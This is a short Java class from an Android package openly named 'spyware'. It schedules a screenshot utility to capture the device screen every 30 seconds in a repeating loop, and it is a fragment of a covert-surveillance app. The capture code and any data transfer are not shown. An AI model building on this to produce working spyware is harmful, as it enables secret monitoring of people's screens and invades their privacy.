package com.example.cristianturetta.spyware;

import android.os.Handler;

public class ScreenshotUtilRunnable implements Runnable{
    private Handler handler = new Handler();

    /**
     * When an object implementing interface <code>Runnable</code> is used
     * to create a thread, starting the thread causes the object's
     * <code>run</code> method to be called in that separately executing
     * thread.
     * <p>
     * The general contract of the method <code>run</code> is that it may
     * take any action whatsoever.
     *
     * @see Thread#run()
     */
    @Override
    public void run() {
        ScreenshotUtil.getInstance().shoot();
        handler.postDelayed(this, 30000);
    }
}
